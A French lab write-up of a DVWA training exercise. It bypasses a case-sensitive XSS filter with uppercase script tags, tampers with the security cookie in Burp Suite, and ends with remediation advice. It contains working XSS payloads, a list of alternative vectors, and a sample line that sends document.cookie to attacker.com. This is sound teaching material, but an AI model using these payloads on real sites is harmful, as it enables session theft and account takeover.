# Write-Up / Reflected XSS & Cookie Manipulation / DVWA Medium

## Résumé exécutif

Ce rapport documente l'exploitation d'une vulnérabilité XSS réfléchi (Cross-Site Scripting) sur DVWA au niveau "Medium". L'objectif était de contourner un filtre de désinfection basique, d'injecter du JavaScript arbitraire, puis de démontrer l'impact réel en manipulant un cookie de session pour bypasser le niveau de sécurité de l'application.

**Résultat** : Contournement du filtre PHP `str_replace()` + exécution de JavaScript arbitraire + manipulation de cookie de session via Burp Suite.

---

## 1. Contexte et environnement

### Cible
- **Application** : DVWA (Damn Vulnerable Web Application)
- **Niveau de sécurité** : Medium
- **Module ciblé** : XSS Reflected
- **URL** : `http://[DVWA-IP]/vulnerabilities/xss_r/`

### Outils utilisés
- Burp Suite Community (proxy HTTP, Repeater, Decoder)
- Navigateur Firefox avec FoxyProxy
- Jedha CLI (lancement du lab DVWA)

---

## 2. Rappel / Qu'est-ce que le XSS réfléchi ?

Le XSS réfléchi (Reflected Cross-Site Scripting) est une vulnérabilité d'injection qui permet à un attaquant d'injecter du code JavaScript dans une page web. Ce code s'exécute dans le navigateur de la victime.

**Mécanisme** :

```
Attaquant forge une URL malveillante
        |
        v
Victime clique sur le lien
        |
        v
Navigateur envoie la requête au serveur
        |
        v
Serveur réfléchit le contenu non filtré dans la réponse HTML
        |
        v
JavaScript s'exécute dans le navigateur de la victime
```

**Pourquoi "réfléchi" ?** La payload n'est pas stockée côté serveur. Elle est incluse dans la requête, le serveur la "réfléchit" dans la réponse, et le navigateur l'exécute. Chaque attaque nécessite que la victime charge l'URL piégée.

**Impact réel** :
- Vol de cookie de session (session hijacking)
- Redirection vers un site malveillant
- Capture de frappes clavier (keylogging)
- Exfiltration de données sensibles affichées dans la page

---

## 3. Analyse de la protection au niveau Medium

### Code PHP vulnérable

```php
// DVWA Medium / xss_r / medium.php
$name = str_replace( '<script>', '', $_GET[ 'name' ] );
echo "<pre>Hello {$name}</pre>";
```

### Ce que le filtre fait

La fonction `str_replace()` cherche la chaîne exacte `<script>` et la supprime.

```
Entrée : <script>alert(1)</script>
Filtre : <script> → ""
Sortie : alert(1)</script>
Résultat HTML : <pre>Hello alert(1)</script></pre>
```

Le script est cassé, l'alerte ne s'exécute pas.

### Ce que le filtre ne fait pas

`str_replace()` effectue une comparaison **sensible à la casse**. Il supprime exactement `<script>` en minuscules. Il ne touche pas aux variations de casse.

```
<SCRIPT>         ne correspond pas au filtre
<Script>         ne correspond pas au filtre
<ScRiPt>         ne correspond pas au filtre
<sCrIpT>         ne correspond pas au filtre
```

En HTML, les navigateurs sont **insensibles à la casse** pour les balises. `<SCRIPT>alert(1)</SCRIPT>` s'exécute exactement comme `<script>alert(1)</script>`.

**La faille logique** : Le développeur a utilisé un filtre par liste noire (blocklist) au lieu d'une validation stricte. Une liste noire ne protège que les cas exactement prévus. Une variation quelconque suffit à la contourner.

---

## 4. Phase de reconnaissance

### 4.1 Configuration de Burp Suite

1. Démarrer Burp Suite / Proxy / Intercept ON
2. FoxyProxy configuré sur `127.0.0.1:8080`
3. Certificat CA Burp installé dans Firefox
4. Naviguer vers le module XSS Reflected de DVWA

### 4.2 Requête originale interceptée

En soumettant `test` dans le champ `name`, Burp intercepte :

```http
GET /vulnerabilities/xss_r/?name=test&Submit=Submit HTTP/1.1
Host: dvwa.local
Cookie: PHPSESSID=abc123xyz; security=medium
```

**Observation** : Le paramètre `name` voyage en clair dans l'URL (méthode GET). La valeur soumise est directement intégrée dans la réponse HTML sans encodage.

### 4.3 Test de la réponse HTML

La réponse du serveur pour `name=test` :

```html
<pre>Hello test</pre>
```

La valeur est insérée telle quelle dans le HTML. Point d'injection confirmé.

### 4.4 Vérification du filtre

Test avec le payload de niveau Easy :

```
name=<script>alert(1)</script>
```

**Réponse du serveur** :
```html
<pre>Hello alert(1)</script></pre>
```

Le `<script>` a été supprimé. Le filtre est actif. Le script est cassé.

---

## 5. Phase d'exploitation

### 5.1 Construction du payload de contournement

En exploitant la sensibilité à la casse de `str_replace()` :

```
Payload : <SCRIPT>alert(document.cookie)</SCRIPT>
```

**Détail** :
- `<SCRIPT>` : balise script en majuscules, non bloquée par le filtre
- `alert(document.cookie)` : affiche le cookie de session actif dans le navigateur
- `</SCRIPT>` : fermeture de la balise

### 5.2 Injection via Burp Repeater

La requête interceptée a été envoyée vers Repeater. Le paramètre `name` a été modifié :

```http
GET /vulnerabilities/xss_r/?name=<SCRIPT>alert(document.cookie)</SCRIPT>&Submit=Submit HTTP/1.1
Host: dvwa.local
Cookie: PHPSESSID=abc123xyz; security=medium
```

**Encodé en URL** (ce que Burp envoie réellement) :

```http
GET /vulnerabilities/xss_r/?name=%3CSCRIPT%3Ealert%28document.cookie%29%3C%2FSCRIPT%3E&Submit=Submit HTTP/1.1
```

### 5.3 Résultat

Le serveur a retourné :

```html
<pre>Hello <SCRIPT>alert(document.cookie)</SCRIPT></pre>
```

Le filtre n'a pas supprimé `<SCRIPT>`. Le navigateur a exécuté la balise et affiché une boîte d'alerte contenant le cookie de session de l'utilisateur courant.

**Impact démontré** : En remplaçant `alert(document.cookie)` par du code d'exfiltration réel, un attaquant peut envoyer ce cookie vers un serveur qu'il contrôle et prendre le contrôle du compte de la victime sans connaître son mot de passe.

**Exemple de payload d'exfiltration réelle** :

```javascript
<SCRIPT>
document.location='http://attacker.com/steal?cookie='+document.cookie
</SCRIPT>
```

---

## 6. Bonus / Cookie Manipulation via Burp Suite

### 6.1 Objectif

Demonstrer qu'un attaquant qui peut intercepter le trafic HTTP peut modifier les cookies de session pour bypasser les mécanismes de sécurité de l'application.

### 6.2 Observation du cookie de sécurité DVWA

Dans la requête interceptée, le cookie `security` définit le niveau de sécurité de l'application :

```
Cookie: PHPSESSID=abc123xyz; security=medium
```

DVWA fait confiance à ce cookie pour déterminer les protections à appliquer. Si ce cookie est modifié côté client, l'application applique un niveau de sécurité différent.

### 6.3 Manipulation du cookie dans Burp

Dans Repeater, le cookie a été modifié manuellement :

```http
GET /vulnerabilities/xss_r/?name=<script>alert(1)</script>&Submit=Submit HTTP/1.1
Host: dvwa.local
Cookie: PHPSESSID=abc123xyz; security=low
```

**Changements effectués** :
- `security=medium` remplacé par `security=low`
- Payload `<script>` en minuscules utilisé (qui était bloqué avant)

### 6.4 Affichage de la réponse dans le navigateur

Dans Burp Repeater :
1. Envoyer la requête modifiée
2. Clic droit sur la réponse / "Show response in browser"
3. Copier le lien généré par Burp
4. Coller dans Firefox

**Résultat** : La page s'affiche comme si le niveau de sécurité était "Low". Le payload `<script>alert(1)</script>` (minuscules) s'exécute sans blocage.

**Ce que cela démontre** : L'application fait confiance à un cookie qui peut être modifié par n'importe qui. Un attaquant peut bypasser les protections de sécurité en modifiant simplement une valeur dans ses cookies. Ce pattern s'appelle **Client-Side Security Reliance** et constitue une mauvaise pratique fondamentale.

---

## 7. Analyse de la cause racine

### 7.1 Flaw 1 / Filtre par liste noire (Blocklist approach)

```php
// Mauvais pattern
$name = str_replace('<script>', '', $_GET['name']);
```

Un filtre par liste noire ne protège que les cas exactement prévus. Chaque variante non prévue (casse, encodage, fragments) contourne le filtre. En sécurité, les listes noires sont considérées comme une approche structurellement fragile.

**Alternatives d'attaque qui auraient aussi fonctionné** :

```html
<SCRIPT>alert(1)</SCRIPT>          <!-- majuscules -->
<img src=x onerror=alert(1)>       <!-- sans balise script du tout -->
<svg onload=alert(1)>              <!-- vecteur SVG -->
<body onload=alert(1)>             <!-- event handler -->
javascript:alert(1)                <!-- protocole javascript -->
<script><!--
alert(1)
--></script>                       <!-- commentaires HTML -->
```

### 7.2 Flaw 2 / Confiance dans les cookies côté client

L'application DVWA détermine le niveau de sécurité en lisant un cookie contrôlé par le client. Tout mécanisme de sécurité basé sur des données contrôlables par l'utilisateur est contournable. Le niveau de sécurité doit être stocké côté serveur (base de données, variable de session).

---

## 8. Recommandations de remédiation

### Solution 1 / Encodage HTML des sorties (RECOMMANDÉ)

Encoder tous les caractères spéciaux avant insertion dans le HTML. Même si l'entrée contient `<script>`, elle sera affichée comme du texte inoffensif.

```php
// Code sécurisé
$name = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
echo "<pre>Hello {$name}</pre>";
```

**Résultat** : `<SCRIPT>alert(1)</SCRIPT>` devient `&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;` dans le HTML. Le navigateur l'affiche comme du texte, il ne l'exécute pas.

### Solution 2 / Content Security Policy (CSP)

Ajouter un header HTTP qui restreint les sources de scripts autorisées.

```
Content-Security-Policy: script-src 'self'
```

Même si du JavaScript est injecté dans le HTML, le navigateur refusera de l'exécuter car il ne vient pas d'une source autorisée.

### Solution 3 / Validation stricte en liste blanche (Whitelist)

Si le champ doit contenir uniquement des noms d'utilisateurs (lettres, chiffres, espaces), rejeter tout ce qui ne correspond pas.

```php
if (!preg_match('/^[a-zA-Z0-9 ]{1,50}$/', $_GET['name'])) {
    die("Caractères invalides détectés.");
}
```

### Solution 4 (pour le cookie de sécurité) / Stocker côté serveur

```php
// Mauvais
$level = $_COOKIE['security'];

// Bon
session_start();
$level = $_SESSION['security'];  // Stocké côté serveur, non modifiable par le client
```

---

## 9. Compétences démontrées

### Sécurité offensive
- Reconnaissance et identification de vulnérabilités XSS
- Contournement de filtres de sécurité (case-sensitive bypass)
- Injection JavaScript arbitraire
- Manipulation de cookies de session via proxy HTTP
- Compréhension des vecteurs XSS alternatifs (img, svg, body, event handlers)

### Outils et technologies
- Burp Suite (proxy, Repeater, manipulation de requêtes HTTP)
- Analyse de code PHP
- Compréhension du DOM / rendu HTML navigateur
- Protocole HTTP / cookies de session

### Méthodologie
- Test de pénétration structuré (analyse du filtre / contournement / exploitation / bonus)
- Analyse de causes racines (RCA)
- Propositions de remédiation multi-niveaux (encodage, CSP, whitelist)

---

## 10. Chaîne d'attaque complète résumée

```
1. Recon
   Intercepter la requête GET avec Burp Suite
   Identifier le paramètre injectable : ?name=
   Confirmer la réflexion dans la réponse HTML

2. Fingerprint du filtre
   Tester <script>alert(1)</script> → bloqué
   Identifier str_replace() case-sensitive

3. Bypass
   Tester <SCRIPT>alert(1)</SCRIPT> → non bloqué

4. Exploitation
   Payload final : <SCRIPT>alert(document.cookie)</SCRIPT>
   Résultat : cookie de session affiché dans le navigateur

5. Bonus
   Modifier security=medium en security=low dans le cookie
   Afficher la réponse dans le navigateur via Burp
   Confirmer le bypass total du niveau de sécurité
```

---

## 11. Ressources et références

- **OWASP / Cross Site Scripting** : https://owasp.org/www-community/attacks/xss/
- **PortSwigger XSS Labs** : https://portswigger.net/web-security/cross-site-scripting
- **OWASP XSS Prevention Cheat Sheet** : https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **PayloadsAllTheThings / XSS** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- **DVWA Source Code** : https://github.com/digininja/DVWA

---

*Write-up rédigé lors de la formation Jedha Cybersécurité / Fullstack RNCP Niveau 6*
